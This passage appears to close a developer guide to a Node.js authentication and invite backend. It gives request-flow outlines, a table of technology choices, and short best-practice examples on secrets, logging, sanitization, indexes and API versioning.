2. POST /api/auth/verify-otp
   ├─ Get user from database
   ├─ Verify OTP hash
   ├─ Generate access token (JWT, 15min)
   ├─ Generate refresh token (random, 7 days)
   ├─ Save refresh token to database
   ├─ Clear OTP from database
   └─ Response: { accessToken, refreshToken, user }
```

**Example 2: Create and Accept Invite**
```
1. POST /api/invites/create
   ├─ Check role hierarchy
   ├─ Generate invite token (random 64 chars)
   ├─ Save invite to database
   ├─ HTTP → Send invite email
   ├─ RabbitMQ → Queue email (background)
   ├─ Socket.IO → Emit event to notification service
   └─ Response: { invite }

2. GET /api/invites/details/:token
   ├─ Find invite by token
   ├─ Check if valid and not expired
   └─ Response: { email, role, invitedBy, organizationName }

3. POST /api/invites/accept
   ├─ Validate invite token
   ├─ Create user account
   ├─ Hash password (bcrypt, 12 rounds)
   ├─ Create organization (if client_admin)
   ├─ Setup 2FA (if requested)
   ├─ Mark invite as accepted
   ├─ Socket.IO → Notify inviter
   └─ Response: { accessToken, refreshToken, user }
```

**Example 3: Token Refresh**
```
1. POST /api/auth/refresh
   ├─ Find refresh token in database
   ├─ Check if valid (not revoked, not expired)
   ├─ Revoke old refresh token
   ├─ Create new refresh token
   ├─ Set replacedBy field on old token
   ├─ Generate new access token
   └─ Response: { accessToken, refreshToken }
```

### Technology Choices Explained

| Technology | Why Used | Alternative | Why Not Alternative |
|------------|----------|-------------|---------------------|
| **Express.js** | Simple, mature, huge ecosystem | Fastify, Koa | Express is battle-tested, team familiarity |
| **MongoDB** | Flexible schema, easy to start | PostgreSQL | No complex relations, JSON documents fit use case |
| **Mongoose** | Schema validation, middleware | Native driver | Type safety, validation, hooks |
| **JWT** | Stateless, scalable | Session cookies | Microservices friendly, no shared session store |
| **bcrypt** | Industry standard for passwords | Argon2 | bcrypt more mature, well-tested |
| **RabbitMQ** | Reliable message delivery | Kafka, Redis | Simpler than Kafka, more features than Redis |
| **Socket.IO** | Auto-reconnection, fallback | Native WebSocket | Better browser support, built-in rooms |
| **Redis** | Fast, pub/sub for Socket.IO | Memcached | Pub/sub support, data structures |
| **Nodemailer** | Simple SMTP sending | SendGrid API | Flexibility, not locked to provider |

---

## 🎓 Extended Best Practices

### 1. **Secrets Management**
```javascript
// ❌ Bad
const JWT_SECRET = 'my-secret-key';

// ✅ Good
const JWT_SECRET = process.env.JWT_ACCESS_SECRET;
if (!JWT_SECRET) {
  logger.error('JWT_ACCESS_SECRET is required');
  process.exit(1);
}

// ✅ Production
// Use secret managers: AWS Secrets Manager, HashiCorp Vault
```

### 2. **Error Logging**
```javascript
// ❌ Bad
console.log(error);

// ✅ Good
logger.error('Operation failed', {
  error: error.message,
  stack: error.stack,
  userId: user._id,
  operation: 'createInvite'
});

// Production: Send to Sentry, Datadog, etc.
```

### 3. **Input Sanitization**
```javascript
// ❌ Bad
const user = await User.findOne({ email: req.body.email });

// ✅ Good
const email = req.body.email.trim().toLowerCase();
const user = await User.findOne({ email });

// Validation middleware handles this automatically
```

### 4. **Database Indexes**
```javascript
// Always index fields used in queries

// Email lookup (frequent):
userSchema.index({ email: 1 });

// Token lookup (frequent):
inviteSchema.index({ token: 1 });

// Compound index for common queries:
userSchema.index({ organization: 1, isActive: 1 });

// Why indexes?
// Without: O(n) - Scans all documents
// With: O(log n) - Binary search
// 100,000 users: 100,000 vs ~17 operations!
```

### 5. **API Versioning**
```javascript
// Future-proof your API

// Current
app.use('/api/auth', authRoutes);

// Better
app.use('/api/v1/auth', authRoutes);

// When breaking changes needed:
app.use('/api/v2/auth', authRoutesV2);

// Both versions work simultaneously
// Gradual migration for clients
```

---

**This concludes the complete deep dive into every system, utility, and component of your backend architecture! 🎉**